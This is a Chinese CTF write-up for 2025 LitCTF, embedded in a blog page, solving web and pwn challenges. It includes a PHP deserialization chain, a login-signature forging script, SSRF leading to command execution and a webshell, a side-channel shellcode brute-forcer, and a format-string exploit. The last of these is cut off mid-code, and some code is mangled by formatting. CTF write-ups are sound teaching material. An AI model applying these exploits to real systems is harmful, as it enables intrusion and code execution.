@@ -1,0 +1,1468 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI） | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="2025 LitCTF Web 三题：NestJS admin 弱密码爆破 + SSTI 绕 {{ 过滤 + 多重宇宙日记 settings JSON 注入 isAdmin&#x3D;true 提权。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI）">
+<meta property="og:url" content="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Web/2025_LitCTF_writeup_by_Mini-Venom/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="2025 LitCTF Web 三题：NestJS admin 弱密码爆破 + SSTI 绕 {{ 过滤 + 多重宇宙日记 settings JSON 注入 isAdmin&#x3D;true 提权。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="LitCTF nest_js 爆破 admin:password">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Web/2025_LitCTF_writeup_by_Mini-Venom/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2025-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-31T16:00:00.000Z" title="发表于 2025-01-01 00:00:00">2025-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-31T16:00:00.000Z" title="更新于 2025-01-01 00:00:00">2025-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/250466.html">https://www.ctfiot.com/250466.html</a><br>ID: 250466</p>
+</blockquote>
+<p>招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 <a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#x63;&#104;&#x61;&#x6d;&#x64;&#53;&#46;&#111;&#x72;&#x67;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#x63;&#104;&#x61;&#x6d;&#x64;&#53;&#46;&#111;&#x72;&#x67;</a>(带上简历和想加入的小组)  </p>
+<p>Web</p>
+<p>nest_js</p>
+<p>爆破账号密码，admin:<br>password</p>
+<p>登入就有flag<br>image-20250525154914269</p>
+<p>星愿信箱</p>
+<p>过滤了{{的ssti<br>image-20250525155244988</p>
+<p>多重宇宙日记</p>
+<p>注册账号a,a,登入在个人资料处看源代码</p>
+<p>        &#x2F;&#x2F; 更新表单的JS提交<br>         document.getElementById(‘profileUpdateForm’).addEventListener(‘submit’, async      function(event) {<br>            event.preventDefault();<br>            const statusEl &#x3D; document.getElementById(‘updateStatus’);<br>            const currentSettingsEl &#x3D; document.getElementById(‘currentSettings’);<br>            statusEl.textContent &#x3D; ‘正在更新…’;</p>
+<p>            const formData &#x3D; new FormData(event.target);<br>            const settingsPayload &#x3D; {};<br>            &#x2F;&#x2F; 构建 settings 对象，只包含有值的字段<br>            if (formData.get(‘theme’)) settingsPayload.theme &#x3D; formData.get(‘theme’);<br>            if (formData.get(‘language’)) settingsPayload.language &#x3D;                   formData.get(‘language’);<br>            &#x2F;&#x2F; …可以添加其他字段</p>
+<p>            try {<br>                const response &#x3D; await fetch(‘&#x2F;api&#x2F;profile&#x2F;update’, {<br>                    method: ‘POST’,<br>                    headers: {<br>                        ‘Content-Type’: ‘application&#x2F;json’,<br>                    },<br>                    body: JSON.stringify({ settings: settingsPayload }) &#x2F;&#x2F; 包装在                   “settings”键下<br>                });<br>                const result &#x3D; await response.json();<br>                if (response.ok) {<br>                    statusEl.textContent &#x3D; ‘成功: ‘ + result.message;<br>                    currentSettingsEl.textContent &#x3D; JSON.stringify(result.settings, null,       2);<br>                    &#x2F;&#x2F; 刷新页面以更新导航栏（如果isAdmin状态改变）<br>                    setTimeout(() &#x3D;&gt;window.location.reload(), 1000);<br>                } else {<br>                    statusEl.textContent &#x3D; ‘错误: ‘ + result.message;<br>                }<br>            } catch (error) {<br>                statusEl.textContent &#x3D; ‘请求失败: ‘ + error.toString();<br>            }<br>        });</p>
+<p>        &#x2F;&#x2F; 发送原始JSON的函数<br>        asyncfunction sendRawJson() {<br>            const rawJson &#x3D; document.getElementById(‘rawJsonSettings’).value;<br>            const statusEl &#x3D; document.getElementById(‘rawJsonStatus’);<br>            const currentSettingsEl &#x3D; document.getElementById(‘currentSettings’);<br>            statusEl.textContent &#x3D; ‘正在发送…’;<br>            try {<br>                const parsedJson &#x3D; JSON.parse(rawJson); &#x2F;&#x2F; 确保是合法的JSON<br>                const response &#x3D; await fetch(‘&#x2F;api&#x2F;profile&#x2F;update’, {<br>                    method: ‘POST’,<br>                    headers: {<br>                        ‘Content-Type’: ‘application&#x2F;json’,<br>                    },<br>                    body: JSON.stringify(parsedJson) &#x2F;&#x2F; 直接发送用户输入的JSON<br>                });<br>                const result &#x3D; await response.json();<br>                if (response.ok) {<br>                    statusEl.textContent &#x3D; ‘成功: ‘ + result.message;<br>                    currentSettingsEl.textContent &#x3D; JSON.stringify(result.settings, null, 2);<br>                     &#x2F;&#x2F; 刷新页面以更新导航栏（如果isAdmin状态改变）<br>                    setTimeout(() &#x3D;&gt;window.location.reload(), 1000);<br>                } else {<br>                    statusEl.textContent &#x3D; ‘错误: ‘ + result.message;<br>                }<br>            } catch (error) {<br>                 statusEl.textContent &#x3D; ‘请求失败或JSON无效: ‘ + error.toString();<br>            }<br>        }</p>
+<p>因为题目说考原型链污染，根据源码的要求的格式，构造如下payload<br>image-20250525155655270<br>image-20250525155825734</p>
+<p>easy_file</p>
+<p>又是爆破账号密码，admin:<br>password,发现是文件上传,测试过滤了&lt;?php,换成&lt;?就可以<br>image-20250525160347128</p>
+<p>在admin.php下可以存在file参数可以任意文件读取（根据题目名猜的，难绷），并且是include，那么说明读取的文件会被当成php文件执行。<br>image-20250525160937310</p>
+<p>君の名は</p>
+<p> &lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>create_function(“”, ‘die(<code>/readflag</code>);’);<br>class Taki<br>{<br>    private $musubi;<br>    private $magic;<br>    publicfunction __unserialize(array $data)<br>    {<br>        $this-&gt;musubi &#x3D; $data[‘musubi’];<br>        $this-&gt;magic &#x3D; $data[‘magic’];<br>        return ($this-&gt;musubi)();<br>    }<br>    publicfunction __call($func,$args){<br>        (new $args<a href="$args%5B1%5D">0</a>)-&gt;{$this-&gt;magic}();<br>    }<br>}</p>
+<p>class Mitsuha<br>{<br>    private $memory;<br>    private $thread;<br>    publicfunction __invoke()<br>    {<br>        return$this-&gt;memory.$this-&gt;thread;<br>    }<br>}</p>
+<p>class KatawareDoki<br>{<br>    private $soul;<br>    private $kuchikamizake;<br>    private $name;</p>
+<p>    publicfunction __toString()<br>    {<br>        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);<br>        return”call error!no flag!”;<br>    }<br>}</p>
+<p>$Litctf2025 &#x3D; $_POST[‘Litctf2025’];<br>if(!preg_match(“&#x2F;^[Oa]:[d]+&#x2F;i”, $Litctf2025)){<br>    unserialize($Litctf2025);<br>}else{<br>    echo”把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆”;<br>} </p>
+<p>利用点就在create_function(“”, ‘die(&#x2F;readflag);’);，他会生成一个匿名函数，我们的目的就是去掉用这个匿名函数，第一关参考<a target="_blank" rel="noopener" href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p>exp:</p>
+<?php
+
+class Taki
+{
+public $musubi;
+public $magic;
+}
+
+class Mitsuha
+{
+public $memory;
+public $thread;
+}
+
+class KatawareDoki
+
+{
+public $soul;
+public $kuchikamizake;
+public $name;
+}
+
+$a=new Taki();
+$a->musubi=new Mitsuha();
+$a->musubi->memory=new KatawareDoki();
+$a->musubi->memory->kuchikamizake="ReflectionFunction";
+$a->musubi->memory->name=" 0lambda_50";
+$a->musubi->memory->soul=new Taki();
+$a->musubi->memory->soul->musubi='time';
+$a->musubi->memory->soul->magic="invoke";
+$aa=new Arrayobject($a);
+$payload=serialize($aa);
+$payload=str_replace(" 0","%00",$payload);
+echo $payload;
+
+image-20250525171106360
+
+easy_signin
+
+扫描目录得到login.html，在源码处看到/api.js,得到/api/sys/urlcode.php?url=，不知道有什么用，尝试登入，输入admin显示密码错误，爆破密码为admin123，显示签名错误
+
+login.html的登入逻辑
+
+   const loginBtn = document.getElementById('loginBtn');
+        const passwordInput = document.getElementById('password');
+        const errorTip = document.getElementById('errorTip');
+        const rawUsername = document.getElementById('username').value; 
+
+     
+        loginBtn.addEventListener('click', async () => {
+            const rawPassword = passwordInput.value.trim();
+            if (!rawPassword) {
+                errorTip.textContent = '请输入密码';
+                errorTip.classList.add('show');
+                passwordInput.focus();
+                return;
+            }
+
+            const md5Username = CryptoJS.MD5(rawUsername).toString();   
+            const md5Password = CryptoJS.MD5(rawPassword).toString();   
+
+     
+            const shortMd5User = md5Username.slice(0, 6);  
+            const shortMd5Pass = md5Password.slice(0, 6);  
+
+          
+            const timestamp = Date.now().toString(); //五分钟
+
+       
+            const secretKey = 'easy_signin';  
+            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp +       secretKey).toString();
+
+            try {
+                const response = await fetch('login.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Sign': sign  
+                    },
+                    body: new URLSearchParams({
+                        username: md5Username,   
+                        password: md5Password,   
+                        timestamp: timestamp
+                    })
+                });
+
+                const result = await response.json();
+                if (result.code === 200) {
+                    alert('登录成功！');
+                    window.location.href = 'dashboard.php'; 
+                } else {
+                    errorTip.textContent = result.msg;
+                    errorTip.classList.add('show');
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    setTimeout(() => errorTip.classList.remove('show'), 3000);
+                }
+            } catch (error) {
+                errorTip.textContent = '网络请求失败';
+                errorTip.classList.add('show');
+                setTimeout(() => errorTip.classList.remove('show'), 3000);
+            }
+        });
+
+        passwordInput.addEventListener('input', () => {
+            errorTip.classList.remove('show');
+        });
+
+发现还需要爆破时间戳，exp
+
+import hashlib
+import time
+import requests
+
+# 目标地址
+url = "http://node9.anna.nssctf.cn:
+23017/login.php"# ← 改成你的实际地址
+
+# 固定信息
+username = "admin"
+password = "admin123"
+secret_key = "easy_signin"
+
+# 当前时间戳（单位：毫秒）
+timestamp = str(int(time.time() * 1000))
+
+# 加密处理
+md5_username = hashlib.md5(username.encode()).hexdigest()
+md5_password = hashlib.md5(password.encode()).hexdigest()
+
+short_md5_user = md5_username[:6]
+short_md5_pass = md5_password[:6]
+
+sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key
+sign = hashlib.md5(sign_raw.encode()).hexdigest()
+
+# 构造请求头和数据
+headers = {
+    "X-Sign": sign
+}
+
+data = {
+    "username": md5_username,
+    "password": md5_password,
+    "timestamp": timestamp
+}
+
+# 发起请求
+response = requests.post(url, headers=headers, data=data)
+
+try:
+    print("[响应状态码]:", response.status_code)
+    print("[响应内容]:", response.text)
+    print(timestamp)
+    print(sign)
+except Exception as e:
+    print("[错误]:", e)
+
+for key, value in response.headers.items():
+    print(f"{key}: {value}")
+
+image-20250525172233323
+
+成功,浏览器放包得到文件，访问
+image-20250525172552714
+
+想到前面的/api/sys/urlcode.php?url=，尝试
+
+/api/sys/urlcode.php？url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php
+
+image-20250525172721996
+
+可以执行命令，不能有空格尝试${IFS},没找到flag，尝试写马
+1c9b20cc39c9d40e8dc4dfa39bb96215
+
+上蚁剑
+image-20250525172906308
+
+pwn
+
+test_your_nc
+
+签到题
+d8be4818c4852450eeec8d8d77f5ad7
+
+shellcode
+
+题目直接执行shellcode
+image
+
+只允许使用read+open，测信道爆破flag
+image
+
+from pwn import *
+from struct import pack
+import time
+import random
+import ctypes
+#from LibcSearcher import *
+from ae64 import AE64
+
+def bug():
+    gdb.attach(p)
+    pause()
+
+def s(a):
+    p.send(a)
+
+def sa(a,b):
+    p.sendafter(a,b)
+
+def sl(a):
+    p.sendline(a)
+
+def sla(a,b):
+    p.sendlineafter(a,b)
+
+def r(a):
+    return p.recv(a, timeout=1)
+
+def rl(a):
+    return p.recvuntil(a, timeout=1)
+
+def inter():
+    p.interactive()
+
+def get_addr(size):
+    return u64(p.recv(size).ljust(8,b'x00'))
+
+def get_addr64():
+    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
+
+def get_addr32():
+    return u32(p.recvuntil("xf7")[-4:])
+
+def get_sb():
+    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
+
+def get_hook():
+    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
+
+li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
+ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
+
+def log_info(message, status=None):
+    color_codes = {
+        'success': ' 33[92m',
+        'error': ' 33[91m',
+        'warning': ' 33[93m',
+        None: ' 33[95m'
+    }
+    color = color_codes.get(status, ' 33[95m')
+    print(f"{color}[*] {message} 33[0m")
+
+def get_random_delay():
+    return random.uniform(0.1, 0.5)
+
+context(os='linux', arch='amd64', log_level='error')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+elf = ELF('./pwn')
+
+# 完整字符集
+full_charset = "{}0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+# 直接在此处设置已知前缀（修改此行即可）
+FLAG_PREFIX = "flag{"  # <-- 在此处修改前缀
+
+if not FLAG_PREFIX:
+    log_info("未设置前缀，将使用完整字典爆破", 'warning')
+    initial_index = 0
+else:
+    initial_index = len(FLAG_PREFIX)
+    log_info(f"将从位置 {initial_index} 开始爆破，前缀: {FLAG_PREFIX}", 'success')
+
+s = full_charset
+char_list = [ord(x) for x in s]
+flag = FLAG_PREFIX  # 初始化flag为预设前缀
+
+shellcode = """
+mov rdi, 0x67616c662f2e
+push rdi
+mov rdi, rsp
+mov rsi, 0
+mov rdx, 0
+mov rax, 2
+syscall
+
+mov rdi, 3
+mov rsi, rsp
+mov rdx, 0x100
+mov rax, 0
+syscall
+
+mov bl, byte ptr [rsp+{}]
+cmp bl, {}
+jz $-0x3 
+"""
+
+index = initial_index
+MAX_RETRY = 5
+MAX_CONSECUTIVE_FAILURES = 10
+consecutive_failures = 0
+
+while True:
+    if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
+        log_info("检测到信道不稳定，暂停5秒后重试", 'warning')
+        time.sleep(5)
+        consecutive_failures = 0
+
+    for i in range(len(s)):
+        retry_count = MAX_RETRY
+        success = False
+
+        while retry_count > 0 and not success:
+            time.sleep(get_random_delay())
+
+            try:
+                # 切换本地/远程模式
+                p = process('./pwn')
+                #p = remote('node8.anna.nssctf.cn', 22581)
+
+                payload = asm(shellcode.format(index, char_list[i]))
+                sla(b'Please input your shellcode: n', payload)
+
+                try:
+                    judge = rl(b'n')
+                
+except (EOFError, TimeoutError):
+                    log_info(f"字符 {s[i]} 导致连接关闭，重试 ({MAX_RETRY-retry_count+1}/{MAX_RETRY})", 'warning')
+                    retry_count -= 1
+                    consecutive_failures += 1
+                    p.close()
+                    continue
+
+                if len(judge) < 3:
+                    flag += s[i]
+                    log_info(f"找到字符: {s[i]}, 当前flag: {flag}", 'success')
+                    index += 1
+                    success = True
+                    consecutive_failures = 0
+
+                p.close()
+
+            
+except Exception as e:
+                log_info(f"连接异常: {str(e)}，剩余重试: {retry_count}", 'error')
+                retry_count -= 1
+                consecutive_failures += 1
+                if p:
+                    p.close()
+            finally:
+                if p:
+                    p.close()
+
+        if success:
+            break
+
+    if '}' in flag:
+        log_info(f"最终flag: {flag}", 'success')
+        exit(0)
+
+inter()    
+
+onlyone
+
+详细的就参考这篇文章
+
+https://xz.aliyun.com/news/17965
+
+这道题也就是模仿的当时强网拟态的那道题目，基本上一摸一样，利用一次fmt打一次指针跳板
+
+劫持返回地址为main， 从而实现多次fmt的机会，然后将printf的返回地址+8的地方改为ogg，最后将printf的返回地址改为ret，触发ogg，getshel
+
+l
+
+from pwn import*
+from struct import pack
+import ctypes
+#from LibcSearcher import *
+from ae64 import AE64
+def bug():
+    gdb.attach(p)
+    pause()
+def s(a):
+    p.send(a)
+def sa(a,b):
+    p.sendafter(a,b)
+def sl(a):
+    p.sendline(a)
+def sla(a,b):
+    p.sendlineafter(a,b)
+def r(a):
+    p.recv(a)
+#def pr(a):
+    #print(p.recv(a))
+def rl(a):
+    return p.recvuntil(a)
+def inter():
+    p.interactive()
+def get_addr(size):
+    return u64(p.recv(size).ljust(8,b'x00'))
+def get_addr64():
+    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
+def get_addr32():
+    return u32(p.recvuntil("xf7")[-4:])
+def get_sb():
+    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
+def get_hook():
+    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
+li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
+ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
+
+#context(os='linux',arch='i386',log_level='debug')   
+context(os='linux',arch='amd64',log_level='debug')
+libc=ELF('./libc-2.31.so')   
+
+elf=ELF('./fmt')
+#p=remote('',)
+p = process('./fmt')
+rl(b'0x')
+stack=int(p.recv(12),16)
+li(hex(stack))
+rl(b'0x')
+libc_base=int(p.recv(12),16)-libc.sym['puts']
+li(hex(libc_base))
+ogg=libc_base+0xe3b01
+addr=(stack&0xffff)-15
+payload  = b'%p'*9
+payload += b'%'+str(addr - 92).encode()+b'c%hn'#11
+payload += b'%'+str(0x10007b-addr).encode()+b'c%39$hhn'
+#bug()
+s(payload)
+add=(stack+17-0x18)&0xffff
+li(hex(add))
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str(add-0x7b).encode()+b'c%27$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str((ogg&0xffff)-0x7b).encode()+b'c%41$hn'
+payload =payload.ljust(0x100,b'x00')
+#bug()
+s(payload)
+
+sleep(0.5)
+payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
+payload+= b'%'+str(add+2-0x7b).encode()+b'c%27$hn'
